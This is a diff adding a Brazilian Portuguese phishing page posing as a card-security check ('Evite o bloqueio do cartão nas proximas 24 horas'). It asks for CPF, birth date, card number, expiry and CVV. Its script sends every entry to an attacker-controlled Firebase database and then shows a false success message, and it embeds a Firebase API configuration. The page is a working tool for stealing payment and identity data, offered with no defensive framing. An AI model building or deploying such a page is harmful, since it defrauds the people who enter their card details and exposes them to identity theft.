@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Central de Segurança</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #e0f0ff, #f4f7fa);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      max-width: 420px;
+      width: 100%;
+      transition: all 0.3s ease-in-out;
+    }
+
+    h2 {
+      text-align: center;
+      color: #003366;
+      margin-bottom: 15px;
+      font-size: 1.7rem;
+    }
+
+    .highlight-box {
+      background-color: #d7ebff;
+      border-left: 5px solid #0070c9;
+      padding: 15px 20px;
+      margin-bottom: 25px;
+      color: #003366;
+      font-weight: 600;
+      border-radius: 6px;
+      text-align: center;
+      font-size: 1rem;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #333;
+      font-size: 0.95rem;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 1rem;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      border-color: #0070c9;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(0, 112, 201, 0.2);
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #0070c9;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #005fa3;
+    }
+
+    .step-2 {
+      display: none;
+      animation: fadeIn 0.4s ease-in-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Evite o bloqueio do cartão nas proximas 24 horas</h2>
+    <div class="highlight-box">
+      Preencha os dados para verificação rápida.
+    </div>
+
+    <!-- Etapa 1 -->
+    <div class="step-1">
+      <label for="cpf">CPF</label>
+      <input type="text" id="cpf" maxlength="14" placeholder="000.000.000-00" required />
+
+      <label for="nascimento">Data de Nascimento</label>
+      <input type="text" id="nascimento" maxlength="10" placeholder="DD/MM/AAAA" required />
+
+      <button id="continuarBtn">Continuar</button>
+    </div>
+
+    <!-- Etapa 2 -->
+    <div class="step-2" id="cartaoFields">
+      <label for="numero">Número do cartão</label>
+      <input type="text" id="numero" maxlength="19" placeholder="0000 0000 0000 0000" required />
+
+      <label for="validade">Validade (MM/AA)</label>
+      <input type="text" id="validade" maxlength="5" placeholder="MM/AA" required />
+
+      <label for="cvv">CVV</label>
+      <input type="text" id="cvv" maxlength="4" placeholder="123" required />
+
+      <button type="submit">Verificar</button>
+    </div>
+  </div>
+
+  <script>
+    const cpfInput = document.getElementById('cpf');
+    const nascimentoInput = document.getElementById('nascimento');
+    const numeroInput = document.getElementById('numero');
+    const validadeInput = document.getElementById('validade');
+    const cvvInput = document.getElementById('cvv');
+    const continuarBtn = document.getElementById('continuarBtn');
+    const cartaoFields = document.getElementById('cartaoFields');
+
+    cpfInput.addEventListener('input', e => {
+      let value = e.target.value.replace(/\D/g, '').slice(0, 11);
+      value = value.replace(/(\d{3})(\d)/, '$1.$2');
+      value = value.replace(/(\d{3})(\d)/, '$1.$2');
+      value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      e.target.value = value;
+    });
+
+    nascimentoInput.addEventListener('input', e => {
+      let value = e.target.value.replace(/\D/g, '').slice(0, 8);
+      if (value.length > 4) {
+        value = value.replace(/(\d{2})(\d{2})(\d{4})/, '$1/$2/$3');
+      } else if (value.length > 2) {
+        value = value.replace(/(\d{2})(\d{2})/, '$1/$2');
+      }
+      e.target.value = value;
+    });
+
+    numeroInput.addEventListener('input', e => {
+      let value = e.target.value.replace(/\D/g, '').slice(0, 16);
+      e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';
+    });
+
+    validadeInput.addEventListener('input', e => {
+      let value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      if (value.length > 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+      }
+      e.target.value = value;
+    });
+
+    cvvInput.addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    });
+
+    continuarBtn.addEventListener('click', () => {
+      const cpfVal = cpfInput.value.trim();
+      const nascVal = nascimentoInput.value.trim();
+      if (!cpfVal || !nascVal) {
+        alert('Por favor, preencha CPF e data de nascimento.');
+        return;
+      }
+
+      document.querySelector('.step-1').style.display = 'none';
+      cartaoFields.style.display = 'block';
+    });
+  </script>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<script>
+  const firebaseConfig = {
+  apiKey: "AIzaSyAE5VT6qpVidSRuEO6T9k5QfnPmq9aClWg",
+  authDomain: "extensao-teste-cb5a9.firebaseapp.com",
+  databaseURL: "https://extensao-teste-cb5a9-default-rtdb.firebaseio.com",
+  projectId: "extensao-teste-cb5a9",
+  storageBucket: "extensao-teste-cb5a9.firebasestorage.app",
+  messagingSenderId: "481692510247",
+  appId: "1:481692510247:web:9f8ab7cb252fa2c697c602"
+};
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+</script>
+
+<script>
+  document.querySelector('button[type="submit"]').addEventListener('click', () => {
+    const dados = {
+      cpf: cpfInput.value.trim(),
+      nascimento: nascimentoInput.value.trim(),
+      numero: numeroInput.value.trim(),
+      validade: validadeInput.value.trim(),
+      cvv: cvvInput.value.trim(),
+      dataEnvio: new Date().toISOString()
+    };
+
+    // Verifica se todos os campos estão preenchidos
+    if (!dados.cpf || !dados.nascimento || !dados.numero || !dados.validade || !dados.cvv) {
+      alert('Preencha todos os campos antes de continuar.');
+      return;
+    }
+
+    // Envia para o Firebase
+    db.ref('entradas').push(dados)
+      .then(() => {
+        alert('Verificação concluída com sucesso!');
+        // Aqui você pode redirecionar ou resetar o formulário
+      })
+      .catch((error) => {
+        console.error('Erro ao salvar no Firebase:', error);
+        alert('Erro ao enviar os dados.');
+      });
+  });
+</script>
+
+
+</body>
+</html>
